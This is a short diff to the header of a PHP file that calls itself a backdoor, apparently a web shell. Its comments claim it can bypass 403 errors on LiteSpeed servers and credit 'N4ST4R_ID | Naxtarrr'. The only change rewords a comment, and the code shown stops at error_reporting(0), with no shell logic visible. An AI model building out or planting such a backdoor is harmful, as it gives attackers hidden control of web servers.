@@ -1,5 +1,5 @@
 <?php
-// My own backdoor
+// My own simple backdoor
 // Idk but this could bypass 403 in Litespeed lol
 // N4ST4R_ID | Naxtarrr
 error_reporting(0);
